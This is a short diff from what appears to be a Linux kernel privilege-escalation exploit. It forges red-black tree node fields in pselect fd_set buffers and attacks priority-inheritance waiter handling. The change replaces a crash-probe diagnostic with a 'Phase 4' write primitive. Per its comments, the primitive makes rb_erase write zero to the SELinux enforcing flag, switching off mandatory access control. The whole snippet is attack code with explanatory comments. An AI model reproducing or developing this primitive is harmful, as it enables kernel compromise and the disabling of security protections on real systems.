@@ -126,12 +126,12 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
      {2, (uint64_t)((pselect_custom_target - 8) | 1), "tree_pc"},
      {3, 0, "tree_right"},
      {4, 0, "tree_left"},
-     /* PI_WAITERS DIAGNOSTIC (2026-08-17): poison pi_tree_entry to force
-      * a crash IF the waiter is in owner's pi_waiters tree.
-      * 0xdead000000000001 & ~3 = 0xdead000000000000 → deref → page fault.
-      * If waiter NOT in pi_waiters: chain walk skips → no crash.
-      * This is a binary probe: crash = YES, stable = NO. */
-     {5, 0xdead000000000001ULL, "pi_pc_probe"},
+     /* Phase 4: pi_waiters write primitive.
+      * Priority stratification: consumer(100) > waiter(110) > owner(120).
+      * Consumer waiter is leftmost → guard passes → rb_erase fires.
+      * pi_tree_entry.__rb_parent_color = (target-8)|1 → rb_erase writes
+      * replacement (0) to *(target) = SELinux enforcing = 0. */
+     {5, (uint64_t)((pselect_custom_target - 8) | 1), "pi_pc"},
      {6, 0, "pi_right"},
      {7, 0, "pi_left"},
 #else
